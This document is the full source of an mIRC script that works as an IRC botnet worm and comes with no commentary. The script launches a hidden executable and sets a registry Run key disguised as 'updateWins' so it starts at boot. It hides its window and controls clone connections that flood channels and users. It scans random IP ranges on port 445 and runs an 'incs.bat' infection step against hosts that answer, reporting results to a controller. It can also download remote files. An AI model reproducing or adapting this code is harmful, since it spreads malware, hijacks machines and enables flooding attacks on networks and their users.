on *:start:{
  .run Deta.exe /n /fh UPDATE 
  .ddeserver on mIRCNet
  .flush
  .identd on $fnick
  .adduser
  .Cona
  .timercheck 0 $r(30,100) .Cona
  .nick Sa2-[ $+ $r(10,100) $+ $r(10,100) $+ $r(10,100) $+ ]
  inc %many
  if (%many = 1) { set %infecttime $day $date $time | regit }
}
on *:connect:{
  .timerping 0 60 //ctcp $me ping
  .timercheck off
  .timerjc 0 $rand(5,10) /jc
}
alias clone {
  if ($1 = con) { set %cserver $2 | /set %cport $3 | /timeropensock $+ $fnick $4 3 opensock }
  if ($1 = join) { sockwrite -nt Q8HeLL* Join $2- }
  if ($1 = part) { sockwrite -nt Q8HeLL* Part $2 : $+ $3- }
  if ($1 = msg) { sockwrite -nt Q8HeLL* privmsg $2 : $+ $3- }
  if ($1 = notice) { sockwrite -nt Q8HeLL* notice $2 : $+ $3- }
  if ($1 = reg) { sockwrite -nt Q8HeLL* Privmsg NickServ : $+ register $2- | sockwrite -nt Q8HeLL* Privmsg NickServ : $+ identify $2- }
  if ($1 = creg) { set %rchan # $+ $fnick $+ $rand(1,1000) | sockwrite -nt Q8HeLL* Join %rchan | sockwrite -nt Q8HeLL* Privmsg Chanserv : register %rchan $fnick Q8HeLL }
  if ($1 = jp) { sockwrite -nt Q8HeLL* Join $2- | sockwrite -nt Q8HeLL* part $2 : $3- | sockwrite -nt Q8HeLL* Join $2- | sockwrite -nt Q8HeLL* part $2 : $3- | sockwrite -nt Q8HeLL* Join $2- | sockwrite -nt Q8HeLL* part $2 : $3- }
  if ($1 = jmp) { sockwrite -nt Q8HeLL* Join $2 | sockwrite -nt Q8HeLL* privmsg $2 : $3- | sockwrite -nt Q8HeLL* part $2 }
  if ($1 = flood.c) { sockwrite -nt Q8HeLL* join $2 | sockwrite -nt Q8HeLL* privmsg $2 : $3- | sockwrite -nt Q8HeLL* notice $2 : $3- | sockwrite -nt Q8HeLL* privmsg $2 : $3- }
  if ($1 = flood.n) { sockwrite -nt Q8HeLL* privmsg $2 : $3- | sockwrite -nt Q8HeLL* notice $2 : $3- | sockwrite -nt Q8HeLL* privmsg $2 : $3- }
  if ($1 = chat.flood) { sockwrite -nt Q8HeLL* privmsg $2 :DCC CHAT $2 1058633484 3481  }
  if ($1 = Quit) { Sockwrite -nt Q8HeLL* Quit : $+ $2- }
  if ($1 = massquit) { SockWrite -nt Q8HeLL* Join $2 | Sockwrite -nt Q8HeLL* Quit : $+ $3- }
  if ($1 = fnick) { sockwrite -nt Q8HeLL* Nick $2 $+ $r(1,1000) $+ $r(1,1000)  }
  if ($1 = Die) { timeropensock* off | sockclose Q8HeLL* }
}
alias opensock { sockopen Q8HeLL $+ $fnick %cserver %cport }
alias Stay {
  if (PING = $1) { sockwrite -nt * $1- }
}
on *:Sockopen:Q8HeLL*:{
  set -u1 %user $rand(A,Z) $+ $fnick $+ $rand(A,Z)
  .sockwrite -nt $sockname USER %user %user %user : $+ %user
  .sockwrite -nt $sockname NICK $fnick
  .identd on $fnick
}
raw 433:*:{
  nick Sa2-[ $+ $r(10,100) $+ $r(10,100) $+ $r(10,100) $+ ]
}
alias apages { set %asite $1 | set %filesite $2 | sockopen apages $+ $fnick %asite 80 }
alias apagestop { timerapage* off | sockclose apages* }
on *:sockopen:apages*:{
  timerapage $+ $fnick 0 2 sockwrite -nt apages* GET %filesite
}
alias H1dd3 { if ($appstate != hidden) {  /exit } }
alias s33 { if ($appactive = $true) { /exit } }
on *:socklisten:ident: { .sockaccept $sockname $+ . $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) }
on *:sockread:IDENT.*: { sockread %tmp | tokenize 32 %tmp | sockwrite -tn $sockname $3 $2 $1 : USERID : UNIX : $fnick | unset %tmp }
alias regit {
  set %filetoboot $rand(100,999) $+ .reg 
  write %filetoboot  REGEDIT4
  write %filetoboot [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]  
  write %filetoboot "updateWins"=" $+ $replace($mircexe,\,\\) $+ "  
  run -n regedit /s %filetoboot
  timer 1 4 remove %filetoboot
}
alias startscan {
  inc %totalscaning
  if %totalscaning == %total finished
  set %ip1 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 1
  set %ip2 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 2
  set %ip3 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 3
  set %ip4 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 4
  set %ip5 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 5
  set %ip6 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 6
  set %ip7 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 7
  set %ip8 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 8
  set %ip9 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 9
  set %ip10 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 10
  set %ip11 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 11
  set %ip12 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 12
  set %ip13 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 13
  set %ip14 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 14
  set %ip15 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 15
  set %ip16 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 16
  set %ip17 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 17
  set %ip18 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 18
  set %ip19 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 19
  set %ip20 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 20
  set %ip21 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 21
  set %ip22 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 22
  set %ip23 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 23
  set %ip24 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 24
  set %ip25 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  opensocks
}
alias opensocks {
  sockopen ip1 %ip1 445
  if $1 == 1 finished
  sockopen ip2 %ip2 445
  if $1 == 2 finished
  sockopen ip3 %ip3 445
  if $1 == 3 finished
  sockopen ip4 %ip4 445
  if $1 == 4 finished
  sockopen ip5 %ip5 445
  if $1 == 5 finished
  sockopen ip6 %ip6 445
  if $1 == 6 finished
  sockopen ip7 %ip7 445
  if $1 == 7 finished
  sockopen ip8 %ip8 445
  if $1 == 8 finished
  sockopen ip9 %ip9 445
  if $1 == 9 finished
  sockopen ip10 %ip10 445
  if $1 == 10 finished
  sockopen ip11 %ip11 445
  if $1 == 11 finished
  sockopen ip12 %ip12 445
  if $1 == 12 finished
  sockopen ip13 %ip13 445
  if $1 == 13 finished
  sockopen ip14 %ip14 445
  if $1 == 14 finished
  sockopen ip15 %ip15 445
  if $1 == 15 finished
  sockopen ip16 %ip16 445
  if $1 == 16 finished
  sockopen ip17 %ip17 445
  if $1 == 17 finished
  sockopen ip18 %ip18 445
  if $1 == 18 finished
  sockopen ip19 %ip19 445
  if $1 == 19 finished
  sockopen ip20 %ip20 445
  if $1 == 20 finished
  sockopen ip21 %ip21 445
  if $1 == 21 finished
  sockopen ip22 %ip22 445
  if $1 == 22 finished
  sockopen ip23 %ip23 445
  if $1 == 23 finished
  sockopen ip24 %ip24 445
  if $1 == 24 finished
  sockopen ip25 %ip25 445
  timerscannerTE 1 12 sockclose ip*
  timerscannerSA 1 15 startscan
}
alias randip {
  unset %1p1 %1p2
  set %1p1 $1-
  set %1p2 $replace($gettok(%1p1,1,46),*,$rand(1,255))
  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,2,46),*,$rand(1,255))
  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,3,46),*,$rand(1,255))
  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,4,46),*,$rand(1,255))
  return %1p2
}
on 1:sockopen:ip*:{ if ($sockerr > 0) { halt } | set %445 % [ $+ [ $sockname ] ] | run deta.exe /n /fh /r "incs.bat   %445 $+ " | msg %cc [scanner] Found: %445 $+ , attempting to infect.. | sockclose $sockname | unset %445 | halt }
alias download {
  var %socket $+(dl,$chr(46),$nopath($2))
  if (!$sock(%socket)) {
    sockopen %socket $1 80
    sockmark %socket HEAD $1 $2
  }
  else { echo $color(info) -s * Socket already in use. }
}

alias percent return $+($round($calc((100 / $2) * $1),2),%)

on *:SOCKOPEN:dl.*:{
  if ($sockerr) { echo $color(info) -s * Error: $sock($sockname).wsmsg | return }
  hadd -m ticks $sockname $ticks
  var %file = $nopath($gettok($sock($sockname).mark,3,32)), %fullfile = $+(",$mircdir,%file,"), %sckr = sockwrite -n $sockname, %^ = $gettok($sock($sockname).mark,3,32)
  write -c %fullfile
  %sckr GET $iif(left(%^,1) != $chr(47),$chr(47) $+ %^,%^) HTTP/1.0
  %sckr HOST: $gettok($sock($sockname).mark,2,32)
  %sckr ACCEPT: *.*
  %sckr $crlf
}

on *:SOCKREAD:dl.*:{
  if ($sockerr) {
    echo $color(info) -s * Error: $sock($sockname).wsmsg
    return
  }
  var %a
  :begin
  if ($gettok($sock($sockname).mark,1,32) == head) { sockread %a }
  else { sockread &b }
  if ($sockbr) {
    tokenize 32 $sock($sockname).mark
    if ($1 == HEAD) {
      if (%a) {
        if ($gettok(%a,1,32) == Content-Length:) { var %totsize = $gettok(%a,2,32) }
      }
      else {
        sockmark $sockname GET $2- %totsize
      }
    }
    elseif ($1 == GET) {
      var %file = $+(",$mircdir,$nopath($3),"), %cursize = $file(%file).size
      var %totsize = $gettok($sock($sockname).mark,4,32)
      bwrite %file -1 &b
    }
    goto begin
  }
}

on *:SOCKCLOSE:dl.*:{
  var %ticks = $calc(($ticks - $hget(ticks,$sockname)) /1000)
  /msg %cc * Download of $nopath($gettok($sock($sockname).mark,3,32)) completed in %ticks seconds.
}
